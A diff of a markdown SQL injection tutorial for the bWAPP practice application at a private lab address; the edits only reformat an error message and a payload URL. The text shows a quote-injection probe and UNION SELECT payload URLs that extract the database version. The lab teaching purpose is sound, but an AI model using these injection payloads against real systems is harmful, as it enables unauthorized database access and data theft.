@@ -8,9 +8,8 @@ We added `'` character to the id in the url to see what kind of output we will g
 The output depends on the script's quality. If script filters input then no SQL error would be returned. Page will load normally or give a warning like “Attack Spotted, Your IP Address has been recorded” or something similar.  However we have got error like this: 
 
 ```
-
-Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
-
+Error: You have an error in your SQL syntax; check the manual that corresponds to your 
+MySQL server version for the right syntax to use near ''' at line 1
 ```
 
 Now we know that there is no any filter. Since we got an error, we are sure that this is SQL injectable and we can try to get some hidden data information from database.
@@ -56,8 +55,9 @@ Adding version() or @@version to second column we can retrieve database version 
 `http://172.16.112.128/bWAPP/sqli_2.php?movie=1 and 1=0 union all select 1,version(),3,4,5,6,7--&action=go`
 
 or 
-
-`http://172.16.112.128/bWAPP/sqli_2.php?movie=1 and 1=0 union all select 1,version(),@@version,4,5,6,7--&action=go` 
+```
+http://172.16.112.128/bWAPP/sqli_2.php?movie=1 and 1=0 union all select 1,version(),@@version,4,5,6,7--&action=go` 
+```
 
 ##### SQL Injection (Search/POST)
 
